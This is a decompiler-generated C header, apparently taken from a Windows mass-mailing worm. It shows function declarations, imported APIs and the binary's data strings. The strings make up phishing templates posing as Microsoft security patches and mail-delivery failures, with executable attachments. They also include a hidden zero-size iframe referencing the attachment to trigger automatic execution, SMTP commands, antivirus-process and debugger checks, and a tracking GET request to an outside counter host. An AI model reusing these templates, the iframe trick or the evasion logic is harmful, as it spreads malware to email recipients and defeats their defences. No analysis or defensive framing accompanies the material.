/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

size_t __cdecl sub_401000(char *, int);
int __cdecl sub_4010E3(LPCSTR lptstrFilename, char *Destination); // idb
BOOL __stdcall EnumFunc(HWND, LPARAM); // idb
HANDLE sub_401294();
void __stdcall sub_40133B(HWND, UINT, UINT_PTR, DWORD); // idb
size_t __thiscall sub_40166C(int this);
char *__thiscall sub_401830(int this, char *Destination, size_t Count);
SOCKET sub_4018C0();
SOCKET __thiscall sub_4018D3(int this);
int __thiscall sub_401946(int this, char *cp, u_short hostshort, HWND hWnd);
int __thiscall sub_401A9E(SOCKET *this, char *buf);
BOOL __thiscall sub_401B0D(_DWORD *this);
int __thiscall sub_401B15(_DWORD *this, int);
int __thiscall sub_401B22(char **this, LPSTR lpsz, int);
void __thiscall sub_401BE7(_DWORD *this);
int __thiscall sub_401C5A(int *this, LPCSTR lpFileName);
int __thiscall sub_401D8A(_DWORD *this);
char *__thiscall sub_401D8E(int *this, char *Destination, int);
int sub_401E2D();
void __cdecl sub_402374(int, int);
char *__cdecl sub_402425(char *Destination, __int16 a2);
char *__cdecl sub_402478(char *Str, int, char *);
char *__cdecl sub_4034D6(char *Destination, __int16, __int16);
char *__cdecl sub_403763(char *Destination);
int sub_40436A();
int __cdecl sub_404411(char *Str, LPCSTR lpFileName); // idb
int sub_404606();
int __cdecl sub_4048C6(DWORD dwMilliseconds); // idb
int sub_404925();
char *sub_40492F();
void __cdecl sub_404945(); // idb
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
int sub_404A78();
void __stdcall TimerFunc(HWND, UINT, UINT_PTR, DWORD); // idb
INT_PTR __stdcall DialogFunc(HWND, UINT, WPARAM, LPARAM); // idb
char *__thiscall sub_404FDA(char *this);
LRESULT __stdcall sub_405067(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
HANDLE sub_405108();
char *__cdecl sub_405474(HANDLE hFile);
int __cdecl sub_40584B(char *cp); // idb
SOCKET __cdecl sub_405B25(HANDLE hObject);
int __cdecl sub_405B67(char *Str, HANDLE hFile); // idb
void __cdecl sub_405CDC(char *cp, int);
int __cdecl sub_40610E(char *Str, int); // idb
int __cdecl sub_406212(LPSTR lpsz, int); // idb
char *__cdecl sub_4063F0(char *cp, HANDLE hFile);
int sub_4066B9();
int sub_4066C3();
void __cdecl sub_4066E1(); // idb
BOOL __cdecl sub_4066EB(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, DWORD dwType, LPCSTR lpString);
BOOL __cdecl sub_40679E(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData);
BOOL __cdecl sub_406840(unsigned int);
unsigned int __cdecl sub_406850(unsigned int);
int __cdecl sub_4068F4(int, unsigned int);
int __cdecl sub_40696B(int, unsigned int);
void sub_4069E2();
void sub_406A51();
void sub_406ACA();
int __cdecl sub_406AFD(char *Str); // idb
void __cdecl sub_406BE3(LPSTR lpCommandLine);
int __cdecl sub_406DCD(char *Destination); // idb
int sub_406F04();
HWND __cdecl sub_40703C(int, HWND hWnd);
int __cdecl sub_4070C1(HWND hDlg); // idb
LPSTR __cdecl sub_4073F8(LPSTR lpsz);
BOOL __cdecl sub_4075E3(LPSTR lpsz, int);
void *__cdecl sub_40772C(HWND hWnd);
HANDLE __cdecl sub_40786C(char *Source, LPVOID lpBuffer, HWND hWnd);
HANDLE __cdecl sub_407B30(LPCSTR lpFileName, LPVOID lpBuffer);
int __cdecl sub_407CBA(int, unsigned int);
HANDLE __cdecl sub_407E9C(const char *);
int __cdecl sub_408003(char *Source, LPCSTR lpExistingFileName); // idb
LPSTR __cdecl sub_408444(LPSTR lpsz);
void __cdecl sub_40864E(HWND hWnd, int);
INT_PTR __stdcall sub_4087AD(HWND, UINT, WPARAM, LPARAM); // idb
DWORD __cdecl sub_4087D7(LPCSTR lpFileName, int, LPCSTR lpExistingFileName, int, int);
void __cdecl sub_408962(HWND hWnd);
int sub_4089A1();
void __noreturn sub_409A73();
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// SOCKET __stdcall socket(int af, int type, int protocol);
// int __stdcall closesocket(SOCKET s);
// int __stdcall WSAAsyncSelect(SOCKET s, HWND hWnd, u_int wMsg, int lEvent);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// u_short __stdcall htons(u_short hostshort);
// struct hostent *__stdcall gethostbyname(const char *name);
// unsigned int __stdcall inet_addr(const char *cp);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __stdcall WSACleanup();
// BOOL __stdcall VerQueryValueA(LPCVOID pBlock, LPCSTR lpSubBlock, LPVOID *lplpBuffer, PUINT puLen);
// BOOL __stdcall GetFileVersionInfoA(LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
// void __stdcall LZClose(INT hFile);
// LONG __stdcall LZCopy(INT hfSource, INT hfDest);
// INT __stdcall LZOpenFileA(LPSTR lpFileName, LPOFSTRUCT lpReOpenBuf, WORD wStyle);
// char *__cdecl strstr(const char *Str, const char *SubStr);
// char *__cdecl strcpy(char *Destination, const char *Source);
// char *__cdecl strcat(char *Destination, const char *Source);
// char *__cdecl strrchr(const char *Str, int Ch);
// size_t __cdecl strlen(const char *Str);
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// void *__cdecl memset(void *, int Val, size_t Size);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// char *__cdecl strncat(char *Destination, const char *Source, size_t Count);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl operator new(size_t Size); idb
// int __cdecl strcmp(const char *Str1, const char *Str2);
// void __cdecl operator delete(void *Block); idb
// int __cdecl atoi(const char *String);
// int __cdecl atexit(void (__cdecl *)());
// char *__cdecl strchr(const char *Str, int Val);
// void __cdecl srand(unsigned int Seed);
// int __cdecl rand();
// char *__cdecl strpbrk(const char *Str, const char *Control);
// void *__cdecl memchr(const void *Buf, int Val, size_t MaxCount);
// int __cdecl _strcmpi(const char *String1, const char *String2);

//-------------------------------------------------------------------------
// Data declarations

// extern LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegDeleteValueA)(HKEY hKey, LPCSTR lpValueName);
// extern LSTATUS (__stdcall *RegDeleteKeyA)(HKEY hKey, LPCSTR lpSubKey);
// extern LSTATUS (__stdcall *RegEnumKeyExA)(HKEY hKey, DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
// extern BOOL (__stdcall *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegCreateKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern HGDIOBJ (__stdcall *GetStockObject)(int i);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern BOOL (__stdcall *Rectangle)(HDC hdc, int left, int top, int right, int bottom);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern HBRUSH (__stdcall *CreateSolidBrush)(COLORREF color);
// extern BOOL (__stdcall *SetEndOfFile)(HANDLE hFile);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern BOOL (__stdcall *FreeResource)(HGLOBAL hResData);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern HRSRC (__stdcall *FindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName);
// extern BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// extern BOOL (__stdcall *MoveFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
// extern BOOL (__stdcall *CreateDirectoryA)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// extern DWORD (__stdcall *GetTempPathA)(DWORD nBufferLength, LPSTR lpBuffer);
// extern DWORD (__stdcall *GetShortPathNameA)(LPCSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer);
// extern BOOL (__stdcall *ResetEvent)(HANDLE hEvent);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern HINSTANCE (__stdcall *ShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
// extern LPSTR (__stdcall *CharLowerA)(LPSTR lpsz);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
// extern BOOL (__stdcall *EnumWindows)(WNDENUMPROC lpEnumFunc, LPARAM lParam);
// extern BOOL (__stdcall *PostMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern LRESULT (__stdcall *DispatchMessageA)(const MSG *lpMsg);
// extern DWORD (__stdcall *GetWindowThreadProcessId)(HWND hWnd, LPDWORD lpdwProcessId);
// extern HWND (__stdcall *GetParent)(HWND hWnd);
// extern BOOL (__stdcall *ExitWindowsEx)(UINT uFlags, DWORD dwReason);
// extern HWND (__stdcall *CreateDialogParamA)(HINSTANCE hInstance, LPCSTR lpTemplateName, HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam);
// extern BOOL (__stdcall *PeekMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
// extern BOOL (__stdcall *IsDialogMessageA)(HWND hDlg, LPMSG lpMsg);
// extern BOOL (__stdcall *UpdateWindow)(HWND hWnd);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern BOOL (__stdcall *GetClientRect)(HWND hWnd, LPRECT lpRect);
// extern BOOL (__stdcall *SetWindowTextA)(HWND hWnd, LPCSTR lpString);
// extern int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC);
// extern HWND (__stdcall *SetFocus)(HWND hWnd);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern void (__stdcall *PostQuitMessage)(int nExitCode);
// extern BOOL (__stdcall *EndDialog)(HWND hDlg, INT_PTR nResult);
// extern UINT (__stdcall *GetDlgItemTextA)(HWND hDlg, int nIDDlgItem, LPSTR lpString, int cchMax);
// extern HWND (__stdcall *GetDlgItem)(HWND hDlg, int nIDDlgItem);
// extern BOOL (__stdcall *EnableWindow)(HWND hWnd, BOOL bEnable);
// extern BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow);
// extern INT_PTR (__stdcall *DialogBoxParamA)(HINSTANCE hInstance, LPCSTR lpTemplateName, HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam);
// extern HWND (__stdcall *FindWindowA)(LPCSTR lpClassName, LPCSTR lpWindowName);
// extern ATOM (__stdcall *RegisterClassExA)(const WNDCLASSEXA *);
// extern HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern UINT_PTR (__stdcall *SetTimer)(HWND hWnd, UINT_PTR nIDEvent, UINT uElapse, TIMERPROC lpTimerFunc);
// extern BOOL (__stdcall *GetMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// extern int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// extern LPSTR (__stdcall *CharUpperA)(LPSTR lpsz);
char *SubStr = "_avp"; // idb
CHAR SubBlock[] = "\\VarFileInfo\\Translation"; // idb
CHAR Text[] = "Try to pull my legs?"; // idb
CHAR Caption[] = " "; // idb
CHAR aIsdebuggerpres[] = "IsDebuggerPresent"; // idb
CHAR aProcess32next[] = "Process32Next"; // idb
CHAR aProcess32first[] = "Process32First"; // idb
CHAR aCreatetoolhelp[] = "CreateToolhelp32Snapshot"; // idb
CHAR ModuleName[] = "kernel32.dll"; // idb
CHAR aGetmodulefilen[] = "GetModuleFileNameExA"; // idb
CHAR aEnumprocessmod[] = "EnumProcessModules"; // idb
CHAR ProcName[] = "EnumProcesses"; // idb
CHAR LibFileName[] = "psapi.dll"; // idb
char Str2[] = "\r\n.\r\n"; // idb
char asc_4106F0[] = "\r\n"; // idb
char Source[] = ":"; // idb
char aQuit[] = "QUIT\r\n"; // idb
char a354[] = "354"; // idb
char buf[] = "DATA\r\n"; // idb
char a250[] = "250"; // idb
char a220[] = "220"; // idb
char aGerms1Dbv[] = "\\germs1.dbv"; // idb
char aGerms0Dbv[] = "\\germs0.dbv"; // idb
CHAR Type[] = "CUSTOM"; // idb
char asc_410770[] = "--\r\n\r\n.\r\n"; // idb
char aContentTransfe[] = "\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment\r\n\r\n"; // idb
char aExe[] = ".exe"; // idb
char aZip[] = ".zip"; // idb
char aName[] = "; name=\""; // idb
char aMsdownload[11] = "msdownload"; // weak
char aCompressed[] = "compressed"; // idb
char aContentTypeApp[] = "\r\nContent-Type: application/x-"; // idb
char asc_410824[] = "--\r\n\r\n--"; // idb
char asc_410830[] = ">\r\n\r\n"; // idb
char a6447821[] = "6447821"; // idb
char aContentTypeIma[] = "\r\nContent-Type: image/gif\r\nContent-Transfer-Encoding: base64\r\nContent-ID: <"; // idb
char a5897421[] = "5897421"; // idb
char asc_410894[] = "--"; // idb
char asc_410898[] = "\r\n\r\n--"; // idb
char aBrBr[] = "<BR><BR>\r\n"; // idb
char aContentTypeTex_0[] = "\r\nContent-Type: text/html\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n"; // idb
char asc_4108FC[] = "\r\n--"; // idb
char asc_41092C[] = "\r\n\r\n"; // idb
char aContentTypeTex[] = "\r\nContent-Type: text/plain\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n"; // idb
char aContentTypeMul_0[] = "\r\nContent-Type: multipart/alternative; boundary=\""; // idb
char aTypeMultipartA[] = "\";\r\n\ttype=\"multipart/alternative\"\r\n\r\n--"; // idb
char aContentTypeMul[] = "\r\nContent-Type: multipart/related; boundary=\""; // idb
char asc_410A0C[] = "\"\r\n\r\n--"; // idb
char aMimeVersion10C[] = "\r\nMime-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\""; // idb
char aXId[] = "\r\nX-ID: "; // idb
char aCorp[7] = " Corp."; // weak
char aCorporation_0[13] = " Corporation"; // weak
char aM[] = "M$"; // idb
char aMs_1[3] = "MS"; // weak
char aFrom_0[] = "from "; // idb
char aComes[7] = "comes "; // weak
char aCame[] = "came "; // idb
char aWhich[] = "which "; // idb
char aInternetExplor[18] = "Internet Explorer"; // weak
char aWindows[] = "Windows"; // idb
char aFor[] = "for "; // idb
char aUpdate_0[] = "update"; // idb
char aPatch_0[6] = "patch"; // weak
char aPackage[8] = "package"; // weak
char aPack_0[5] = "pack"; // weak
char aCorrection[] = "correction "; // idb
char aCorrective[12] = "corrective "; // weak
char aSecurity_0[10] = "security "; // weak
char aCritical_0[10] = "critical "; // weak
char aInternet_0[10] = "internet "; // weak
char aImportant[11] = "important "; // weak
char aThese[] = "these "; // idb
char aThe[] = "the "; // idb
char aThat[6] = "that "; // weak
char aThis[6] = "this "; // weak
char aInstall[] = "Install "; // idb
char aApply[7] = "Apply "; // weak
char aUse[5] = "Use "; // weak
char aWatch[7] = "Watch "; // weak
char aSee[5] = "See "; // weak
char aTakeALookAt[16] = "Take a look at "; // weak
char aLookAt[9] = "Look at "; // weak
char aTryOn[8] = "Try on "; // weak
char aTry[5] = "Try "; // weak
char aTaste[7] = "Taste "; // weak
char aProve[7] = "Prove "; // weak
char aCheckOut[11] = "Check out "; // weak
char aCheck[7] = "Check "; // weak
char aFw[] = "FW: "; // idb
char aFwd[6] = "FWD: "; // weak
char aRe[5] = "RE: "; // weak
char aUpgrade[] = "Upgrade"; // idb
char aPack[5] = "Pack"; // weak
char aUpdate[7] = "Update"; // weak
char aPatch[6] = "Patch"; // weak
char aCritical[10] = "Critical "; // weak
char aNet_0[5] = "Net "; // weak
char aLatest[] = "Latest "; // idb
char aNew[5] = "New "; // weak
char aLast[6] = "Last "; // weak
char aNewest[8] = "Newest "; // weak
char aCurrent[9] = "Current "; // weak
char aSubject[] = "\r\nSUBJECT: "; // idb
char asc_410C4C[] = ">"; // idb
char aClient[] = "Client"; // idb
char aConsumer[9] = "Consumer"; // weak
char aPartner[8] = "Partner"; // weak
char aUser[] = "User"; // idb
char aCustomer_0[9] = "Customer"; // weak
char aCommercial[12] = "Commercial "; // weak
char aNewsgroups[] = ">\r\nNEWSGROUPS: "; // idb
char aTo[] = ">\r\nTO: \""; // idb
char aNet[5] = ".net"; // weak
char aCom[] = ".com"; // idb
char aMsdn[] = "msdn"; // idb
char aMicrosoft_1[10] = "microsoft"; // weak
char aMs_0[3] = "ms"; // weak
char aMsn[4] = "msn"; // weak
char asc_410CD4[2] = "."; // idb
char aNews[5] = "news"; // weak
char aBulletin_0[9] = "bulletin"; // weak
char aConfidence[11] = "confidence"; // weak
char aAdvisor[8] = "advisor"; // weak
char aUpdates[8] = "updates"; // weak
char aTechnet[8] = "technet"; // weak
char aSupport_0[8] = "support"; // weak
char aNewsletters[] = "newsletters"; // idb
char asc_410D24[] = "@"; // idb
char asc_410D28[2] = "-"; // weak
char asc_410D2C[] = "_"; // idb
char asc_410D30[] = "\" <"; // idb
char aUnknown[] = "unknown"; // idb
char aMicrosoft_0[] = "Microsoft"; // idb
char aSupport[] = "Support"; // idb
char aAssistance[11] = "Assistance"; // weak
char aServices[9] = "Services"; // weak
char aBulletin[9] = "Bulletin"; // weak
char aCustomer[] = "Customer "; // idb
char aPublic[8] = "Public "; // weak
char aTechnical[11] = "Technical "; // weak
char aCenter[7] = "Center"; // weak
char aDepartment[11] = "Department"; // weak
char aSection[8] = "Section"; // weak
char aDivision[9] = "Division"; // weak
char aSecurity[] = "Security "; // idb
char aNetwork[] = "Network "; // idb
char aInternet[] = "Internet "; // idb
char aProgram[9] = "Program "; // weak
char aCorporation[] = "Corporation "; // idb
char aMicrosoft[] = "Microsoft "; // idb
char aMs[] = "MS "; // idb
char aFrom[] = "FROM: \""; // idb
char aThisUpdateIncl[] = "\r\nThis update includes the functionality =\r\nof all previously released patches."; // idb
char aComputer[9] = "computer"; // weak
char aSystem[] = "system"; // idb
char aOnYour[] = " on your "; // idb
char aCode[5] = "code"; // weak
char aExecutable[] = "executable"; // idb
char aToRun[] = " to run "; // idb
char aMaliciousUser[15] = "malicious user"; // weak
char aAttacker[] = "attacker"; // idb
char aTheMostSerious[] = ", the most serious of which could\r\nallow an "; // idb
char aFromTheseVulne[] = "\r\nfrom these vulnerabilities"; // idb
char aMaintainTheSec[39] = "maintain the security of your computer"; // weak
char aProtectYourCom[] = "protect your computer"; // idb
char aHelp[] = "help "; // idb
char aContinueKeepin[38] = "continue keeping your computer secure"; // weak
char aInstallNowTo[] = ".\r\nInstall now to "; // idb
char aVulnerabilitie[] = " vulnerabilities"; // idb
char aNew_0[4] = "new"; // weak
char aNewlyDiscovere[] = "newly discovered"; // idb
char aAsWellAsThree[] = "\r\nas well as three "; // idb
char aAllKnownSecuri[] = "\r\nall known security vulnerabilities affecting\r\nMS Internet Explorer, MS Outlook and MS Outlook Express"; // idb
char aEliminates[] = "eliminates"; // idb
char aResolves[9] = "resolves"; // weak
char aFixes[6] = "fixes"; // weak
char aDecember[] = "December"; // idb
char aNovember[9] = "November"; // weak
char aOctober[8] = "October"; // weak
char aSeptember[10] = "September"; // weak
char aAugust[7] = "August"; // weak
char aJuly[5] = "July"; // weak
char aJune[5] = "June"; // weak
char aMay[4] = "May"; // weak
char aApril[6] = "April"; // weak
char aMarch[6] = "March"; // weak
char aFebruary[9] = "February"; // weak
char aJanuary[8] = "January"; // weak
char aThisIsTheLates[] = "this is the latest version of security update, the\r\n\""; // idb
char aContentTransfe_0[] = "\"\r\nContent-Transfer-Encoding: base64\r\nContent-Id: <"; // idb
char aCom_0[] = "com"; // idb
char aScr[4] = "scr"; // weak
char aBat[4] = "bat"; // weak
char aPif[4] = "pif"; // weak
char aExe_0[4] = "exe"; // weak
char aWav[4] = "wav"; // weak
char aMidi[] = "midi"; // idb
char aBodyHtml[] = "</BODY></HTML>\r\n\r\n"; // idb
char aBrBrBrMessageF[] = "<BR><BR><BR>Message follows:<BR><BR><BR><BR>\r\n"; // idb
char aMail_2[] = "mail "; // idb
char aMessage_1[9] = "message "; // weak
char aBrBrBrUndelive_0[25] = "<BR><BR><BR>Undelivered "; // weak
char aBrBrBrUndelive[] = "<BR><BR><BR>Undeliverable "; // idb
char aToOneOrMoreDes[] = "to one or more destinations.<BR>\r\n"; // idb
char aToTheFollowing[34] = "to the following addresses:<BR>\r\n"; // weak
char aTheMessageRetu[] = "the message returned below could not be delivered =\r\n"; // idb
char aIWasnTAbleToDe[42] = "I wasn't able to deliver your message =\r\n"; // weak
char aBrIMAfraid[] = "<BR>I'm afraid =\r\n"; // idb
char aBrIMSorryToHav[45] = "<BR>I'm sorry to have to inform you that =\r\n"; // weak
char aBrIMSorry[18] = "<BR>I'm sorry =\r\n"; // weak
char aBr[] = "\r\n<BR>"; // idb
char aBrMessageFrom[] = "<BR>Message from "; // idb
char aBrThisIsTheQma[] = "<BR>This is the qmail program<BR>\r\n"; // idb
char aBrBrHi[] = "<BR><BR>Hi.\r\n"; // idb
char aHeight3d0Width[] = "\" height=3D0 width=3D0></iframe>\r\n"; // idb
char aIframeSrc3dCid[] = "<iframe src=3D\"cid:"; // idb
char aHtmlHeadHeadBo[] = "<HTML>\r\n<HEAD></HEAD>\r\n<BODY>\r\n"; // idb
char aMimeVersion10C_0[] = "\r\nMime-Version: 1.0\r\nContent-Type: multipart/alternative;\r\n\tboundary=\""; // idb
char aNotice[] = "Notice"; // idb
char aReport[7] = "Report"; // weak
char aAnnouncement[13] = "Announcement"; // weak
char aAdvice[7] = "Advice"; // weak
char aLetter[7] = "Letter"; // weak
char aFailure[] = "Failure "; // idb
char aAbort[7] = "Abort "; // weak
char aError[7] = "Error "; // weak
char aBug[5] = "Bug "; // weak
char aUserUnknown[14] = " User unknown"; // weak
char aMailer_0[7] = "Mailer"; // weak
char aSender[7] = "Sender"; // weak
char aReturnedTo[] = " Returned To "; // idb
char aMessage_0[8] = "Message"; // weak
char aMail_1[] = "Mail"; // idb
char aUndelivered[] = "Undelivered "; // idb
char aUndeliverable[15] = "Undeliverable "; // weak
char aReturned[10] = "Returned "; // weak
char aSubject_0[] = ">\r\nSUBJECT: "; // idb
char aDomain[7] = "domain"; // weak
char aServer[] = "server"; // idb
char aHome[] = "home"; // idb
char aMx[3] = "mx"; // weak
char aYour[5] = "your"; // weak
char aUser_0[] = "user"; // idb
char aReceiver_0[9] = "receiver"; // weak
char aRecipient_0[10] = "recipient"; // weak
char aClient_0[7] = "client"; // weak
char aReceiver[9] = "Receiver"; // weak
char aRecipient[10] = "Recipient"; // weak
char aPuremail[] = "puremail"; // idb
char aAmerica[8] = "america"; // weak
char aNetmail[8] = "netmail"; // weak
char aFreemail[9] = "freemail"; // weak
char aYahoo[6] = "yahoo"; // weak
char aAol[4] = "aol"; // weak
char aBigfoot[8] = "bigfoot"; // weak
char aRocketmail[11] = "rocketmail"; // weak
char aBot[] = "bot"; // idb
char aRoutine[8] = "routine"; // weak
char aProgram_0[8] = "program"; // weak
char aDaemon[7] = "daemon"; // weak
char aRobot[6] = "robot"; // weak
char aAutomat[8] = "automat"; // weak
char aEngine[7] = "engine"; // weak
char aForm[5] = "form"; // weak
char aService_0[8] = "service"; // weak
char aPost[] = "post"; // idb
char aWeb[4] = "web"; // weak
char aSmtp[5] = "smtp"; // weak
char aEmail_0[6] = "email"; // weak
char aMailer[7] = "mailer"; // weak
char aMaster[7] = "master"; // weak
char aMail_0[5] = "mail"; // weak
char aSystem_0[7] = "System"; // weak
char aService[] = "Service"; // idb
char aDelivery[] = "Delivery "; // idb
char aStorage[9] = "Storage "; // weak
char aMail[] = "Mail "; // idb
char aMessage[9] = "Message "; // weak
char aEmail[7] = "Email "; // weak
char aInet[6] = "Inet "; // weak
char aPostmaster[11] = "Postmaster"; // weak
char aAdministrator[14] = "Administrator"; // weak
char aAdmin[6] = "Admin"; // weak
char aGetHttpWw2FceV[] = "GET http://ww2.fce.vutbr.cz/bin/counter.gif/link=bacillus&width=6&set=cnt006 HTTP/1.0\r\n\r\n"; // idb
